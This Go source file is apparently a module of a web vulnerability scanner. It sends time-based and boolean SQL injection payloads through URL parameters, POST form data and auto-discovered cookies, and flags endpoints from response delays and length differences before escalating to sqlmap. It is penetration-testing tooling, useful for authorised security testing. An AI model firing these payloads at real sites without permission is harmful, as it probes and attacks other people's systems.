package modules

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"IluskaX/internal/ui"
)

func QuickSQLiTest(urlFile, allURLFile string, w io.Writer, cookie string, limiter <-chan time.Time, sb *ui.StatusBar, rc *ui.ReportCollector) bool {
	fmt.Fprintln(w, "┌─ [PHASE 1] QUICK SQLi TEST - Analyzing response differences")

	f, err := os.Open(urlFile)
	if err != nil {
		fmt.Fprintf(w, "├─ [ERROR] Cannot open URL file\n")
		return false
	}
	defer f.Close()

	client := &http.Client{Timeout: 8 * time.Second}

	doGet := func(u string) (*http.Response, int64, error) {
		<-limiter
		req, err := http.NewRequest("GET", u, nil)
		if err != nil {
			return nil, 0, err
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; LuskaScanner/1.0)")
		if cookie != "" {
			req.Header.Set("Cookie", cookie)
		}
		resp, err := client.Do(req)
		if err != nil {
			return nil, 0, err
		}
		body, err := io.ReadAll(io.LimitReader(resp.Body, 1*1024*1024))
		resp.Body.Close()
		return resp, int64(len(body)), err
	}

	sc := bufio.NewScanner(f)
	testCount, vulnerableCount := 0, 0
	var paramURLs []string

	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" && HasParams(line) {
			paramURLs = append(paramURLs, line)
		}
	}

	if sb != nil {
		limit := 20
		if len(paramURLs) < limit {
			limit = len(paramURLs)
		}
		sb.SetPhase("QUICK SQLi", int64(limit))
	}

	f2, err := os.Open(urlFile)
	if err != nil {
		return false
	}
	defer f2.Close()

	sc2 := bufio.NewScanner(f2)
	for sc2.Scan() && testCount < 20 {
		testURL := strings.TrimSpace(sc2.Text())
		if testURL == "" || !HasParams(testURL) {
			continue
		}
		testCount++

		if sb != nil {
			sb.Log("├─ Testing [%d/20] %s\n", testCount, ui.Truncate(testURL, ui.MaxURLLen))
		} else {
			fmt.Fprintf(w, "├─ Testing [%d/20] %s\n", testCount, testURL)
		}

		_, baselineLen, err := doGet(testURL)
		if err != nil {
			fmt.Fprintf(w, "│  [SKIP] Connection error: %v\n", err)
			if sb != nil {
				sb.Tick(1)
			}
			continue
		}

		vulnerable := false
		payload := ""

		if p, found := checkTimeBasedWithPayload(testURL, doGet, w); found {
			vulnerableCount++
			payload = p
			vulnerable = true
			msg := ui.Red("  ✓ VULNERABLE (time-based)")
			if sb != nil {
				sb.Log("%s\n", msg)
			} else {
				fmt.Fprintln(w, msg)
			}
		} else if p, found := checkBooleanWithPayload(testURL, baselineLen, doGet, w); found {
			vulnerableCount++
			payload = p
			vulnerable = true
			msg := ui.Red("  ✓ VULNERABLE (boolean)")
			if sb != nil {
				sb.Log("%s\n", msg)
			} else {
				fmt.Fprintln(w, msg)
			}
		} else {
			msg := ui.Dim("  ○ Safe")
			if sb != nil {
				sb.Log("%s\n", msg)
			} else {
				fmt.Fprintln(w, msg)
			}
		}

		if vulnerable && rc != nil {
			rc.AddFinding(ui.Finding{
				Type:    ui.VulnSQLi,
				Level:   ui.LevelVulnerability,
				URL:     testURL,
				Payload: payload,
				Detail:  "Quick SQLi",
			})
		}

		if sb != nil {
			sb.Tick(1)
		}
	}

	vulnerableCount += testPostForms(allURLFile, w, cookie, limiter, sb, rc)
	vulnerableCount += testCookieInjection(allURLFile, w, cookie, sb, rc)

	fmt.Fprintln(w, "├─ Quick test complete")
	if vulnerableCount > 0 {
		fmt.Fprintf(w, "├─ %s\n", ui.Red(fmt.Sprintf("[ALERT] Found %d vulnerable URLs", vulnerableCount)))
		fmt.Fprintln(w, "└─ Status: ESCALATING SQLMAP SCAN ⚠️")
		return true
	}
	fmt.Fprintln(w, "├─ No obvious SQLi patterns detected")
	fmt.Fprintln(w, "└─ Status: Proceeding to next phase")
	return false
}

func checkTimeBasedWithPayload(testURL string, doGet func(string) (*http.Response, int64, error), w io.Writer) (string, bool) {
	payloads := []string{
		"1; WAITFOR DELAY '0:0:2'--",
		"1 AND SLEEP(2)--",
	}
	for _, p := range payloads {
		start := time.Now()
		resp, _, err := doGet(InjectPayload(testURL, p))
		elapsed := time.Since(start)
		if err != nil {
			continue
		}
		if elapsed > 1800*time.Millisecond {
			fmt.Fprintf(w, "│  [TIME-BASED] payload: %s, delay: %v\n", ui.Truncate(p, 60), elapsed.Round(time.Millisecond))
			return p, true
		}
		if resp.StatusCode >= 500 {
			fmt.Fprintf(w, "│  [POTENTIAL] HTTP %d on: %s\n", resp.StatusCode, ui.Truncate(p, 60))
			return p, true
		}
	}
	return "", false
}

func checkTimeBasedOnly(testURL string, doGet func(string) (*http.Response, int64, error), w io.Writer) bool {
	_, found := checkTimeBasedWithPayload(testURL, doGet, w)
	return found
}

func checkBoolean(testURL string, baselineLen int64, doGet func(string) (*http.Response, int64, error), w io.Writer) bool {
	_, found := checkBooleanWithPayload(testURL, baselineLen, doGet, w)
	return found
}

func checkBooleanWithPayload(testURL string, baselineLen int64, doGet func(string) (*http.Response, int64, error), w io.Writer) (string, bool) {
	pairs := [][2]string{
		{"' OR '1'='1", "' OR '1'='2"},
		{"' AND 1=1--", "' AND 1=2--"},
	}
	for _, pair := range pairs {
		_, lenTrue, err1 := doGet(InjectPayload(testURL, pair[0]))
		_, lenFalse, err2 := doGet(InjectPayload(testURL, pair[1]))
		if err1 != nil || err2 != nil {
			continue
		}
		diffTrueBase := float64(lenTrue-baselineLen) / float64(baselineLen+1) * 100
		diffTrueFalse := float64(lenTrue-lenFalse) / float64(lenTrue+1) * 100
		if diffTrueFalse > 20 && diffTrueBase < 15 {
			fmt.Fprintf(w, "│  [BOOLEAN] true=%d false=%d baseline=%d diff=%.1f%%\n",
				lenTrue, lenFalse, baselineLen, diffTrueFalse)
			return pair[0], true
		}
	}
	return "", false
}

func testPostForms(allURLFile string, w io.Writer, cookie string, limiter <-chan time.Time, sb *ui.StatusBar, rc *ui.ReportCollector) int {
	forms := ReadPostForms(allURLFile)
	if len(forms) == 0 {
		return 0
	}
	fmt.Fprintf(w, "├─ Testing %d POST forms\n", len(forms))
	client := &http.Client{Timeout: 15 * time.Second}
	payloads := []string{
		"x'||pg_sleep(10)--",
		"x'||(SELECT pg_sleep(10))--",
		"1 AND SLEEP(10)--",
		"1; WAITFOR DELAY '0:0:10'--",
	}
	count := 0
	for _, form := range forms {
		if sb != nil {
			sb.Log("├─ POST %s data=%s\n", ui.Truncate(form.URL, ui.MaxURLLen), ui.Truncate(form.Data, 40))
		} else {
			fmt.Fprintf(w, "├─ POST %s data=%s\n", form.URL, form.Data)
		}
		found := false
		for _, p := range payloads {
			injected := InjectPostPayload(form.Data, p)
			req, err := http.NewRequest("POST", form.URL, strings.NewReader(injected))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; LuskaScanner/1.0)")
			if cookie != "" {
				req.Header.Set("Cookie", cookie)
			}
			<-limiter
			start := time.Now()
			resp, err := client.Do(req)
			elapsed := time.Since(start)
			if err != nil {
				continue
			}
			resp.Body.Close()
			if elapsed > 9*time.Second {
				fmt.Fprintf(w, "│  [TIME-BASED POST] payload=%q delay=%v\n", ui.Truncate(p, 60), elapsed.Round(time.Millisecond))
				msg := ui.Red("  ✓ VULNERABLE")
				if sb != nil {
					sb.Log("%s\n", msg)
				} else {
					fmt.Fprintln(w, msg)
				}
				count++
				found = true
				if rc != nil {
					rc.AddFinding(ui.Finding{
						Type:    ui.VulnSQLi,
						Level:   ui.LevelVulnerability,
						URL:     form.URL,
						Payload: p,
						Detail:  "POST time-based",
					})
				}
				break
			}
		}
		if !found {
			fmt.Fprintln(w, ui.Dim("  ○ Safe"))
		}
	}
	return count
}

func testCookieInjection(allURLFile string, w io.Writer, cookie string, sb *ui.StatusBar, rc *ui.ReportCollector) int {
	autoClient := &http.Client{
		Timeout: 25 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) > 0 {
				req.Header.Set("Cookie", via[0].Header.Get("Cookie"))
			}
			return nil
		},
	}

	f, err := os.Open(allURLFile)
	if err != nil {
		return 0
	}
	defer f.Close()

	var scanURLs []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		l := strings.TrimSpace(sc.Text())
		if l == "" {
			continue
		}
		parsed, err := url.Parse(l)
		if err != nil {
			continue
		}
		if IsStaticAsset(strings.ToLower(parsed.Path)) {
			continue
		}
		if strings.Contains(parsed.Path, ".") && !strings.HasSuffix(parsed.Path, "/") {
			ext := parsed.Path[strings.LastIndex(parsed.Path, "."):]
			if ext != ".php" && ext != ".asp" && ext != ".aspx" && ext != ".jsp" {
				continue
			}
		}
		scanURLs = append(scanURLs, l)
	}

	autoCookies := CollectCookieNames(scanURLs, cookie, autoClient)

	if cookie != "" {
		seen := map[string]bool{}
		for _, n := range autoCookies {
			seen[n] = true
		}
		for _, part := range strings.Split(cookie, ";") {
			part = strings.TrimSpace(part)
			if kv := strings.SplitN(part, "=", 2); len(kv) == 2 {
				name := strings.TrimSpace(kv[0])
				if name != "" && !seen[name] {
					autoCookies = append(autoCookies, name)
					seen[name] = true
				}
			}
		}
	}

	if len(autoCookies) == 0 {
		fmt.Fprintln(w, "├─ No cookies found in responses, skipping cookie injection")
		return 0
	}

	fmt.Fprintf(w, "├─ Auto-discovered %d cookies to test: %s\n", len(autoCookies), strings.Join(autoCookies, ", "))

	parsedCookies := map[string]string{}
	for _, part := range strings.Split(cookie, ";") {
		part = strings.TrimSpace(part)
		if kv := strings.SplitN(part, "=", 2); len(kv) == 2 {
			parsedCookies[strings.TrimSpace(kv[0])] = strings.TrimSpace(kv[1])
		}
	}

	payloads := []string{
		"x'||pg_sleep(10)--",
		"x'||SLEEP(10)--",
		"x'; WAITFOR DELAY '0:0:10'--",
		"x' AND SLEEP(10)--",
		"x' OR SLEEP(10)--",
	}

	count := 0
	for _, cookieName := range autoCookies {
		if sb != nil {
			sb.Log("├─ Cookie injection: %s\n", cookieName)
		} else {
			fmt.Fprintf(w, "├─ Cookie injection: %s\n", cookieName)
		}
		found := false
	outerCookie:
		for _, testURL := range scanURLs {
			for _, p := range payloads {
				mod := map[string]string{}
				for k, v := range parsedCookies {
					mod[k] = v
				}
				mod[cookieName] = p
				var parts []string
				for k, v := range mod {
					parts = append(parts, k+"="+v)
				}
				if _, ok := parsedCookies[cookieName]; !ok {
					parts = append(parts, cookieName+"="+p)
				}
				req, err := http.NewRequest("GET", testURL, nil)
				if err != nil {
					continue
				}
				req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; LuskaScanner/1.0)")
				req.Header.Set("Cookie", strings.Join(parts, "; "))
				start := time.Now()
				resp, err := autoClient.Do(req)
				elapsed := time.Since(start)
				if err != nil {
					continue
				}
				resp.Body.Close()
				if elapsed > 9*time.Second {
					fmt.Fprintf(w, "│  [TIME-BASED COOKIE] %s payload=%q url=%s delay=%v\n",
						cookieName, ui.Truncate(p, 50), ui.Truncate(testURL, ui.MaxURLLen), elapsed.Round(time.Millisecond))
					msg := ui.Red("  ✓ VULNERABLE")
					if sb != nil {
						sb.Log("%s\n", msg)
					} else {
						fmt.Fprintln(w, msg)
					}
					count++
					found = true
					if rc != nil {
						rc.AddFinding(ui.Finding{
							Type:    ui.VulnSQLi,
							Level:   ui.LevelVulnerability,
							URL:     testURL,
							Payload: cookieName + "=" + p,
							Detail:  "Cookie injection",
						})
					}
					break outerCookie
				}
			}
		}
		if !found {
			fmt.Fprintln(w, ui.Dim("  ○ Safe"))
		}
	}
	return count
}
